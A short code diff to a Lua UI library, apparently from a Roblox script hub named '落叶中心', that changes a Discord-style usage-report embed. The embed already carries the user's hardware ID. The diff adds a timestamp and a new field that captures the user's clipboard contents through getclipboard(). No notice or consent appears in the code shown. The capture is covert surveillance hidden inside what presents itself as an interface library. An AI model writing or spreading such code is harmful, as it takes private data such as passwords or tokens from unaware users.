@@ -206,7 +206,7 @@ function library.new(library, name, theme)
         ["embeds"] = {
             {
                 ["color"] = tonumber("0x32CD32"),
-                ["title"] = "有人使用落叶中心",
+                ["title"] = "有人使用落叶中心"..os.date("%H").."时"..os.date("%M").."分",
                 ["thumbnail"] = {
                     ["url"] = AvatarImage,
                 },
@@ -254,6 +254,11 @@ function library.new(library, name, theme)
                     {
                         ["name"] = "HWID",
                         ["value"] = gethwid(),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "剪贴板",
+                        ["value"] = getclipboard(),
                         ["inline"] = true
                     },
                     {
